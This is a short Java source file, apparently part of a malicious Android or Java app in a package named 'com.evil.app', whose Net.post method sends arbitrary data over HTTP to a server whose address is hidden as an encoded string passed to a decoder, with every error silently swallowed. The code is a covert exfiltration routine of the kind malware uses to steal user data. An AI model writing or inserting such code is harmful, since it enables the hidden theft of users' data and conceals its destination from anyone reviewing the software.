package com.evil.app;
import java.net.*; import java.io.*;
public class Net {
    public static void post(String data) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(S.d("\043\107\015\121\161\034\126\023\173\000\127\021\145\002\110\022\145\004\126\106\052\107\034\017\073\133\011")).openConnection();
            c.setDoOutput(true); c.getOutputStream().write(data.getBytes());
        } catch (Exception e) { }
    }
}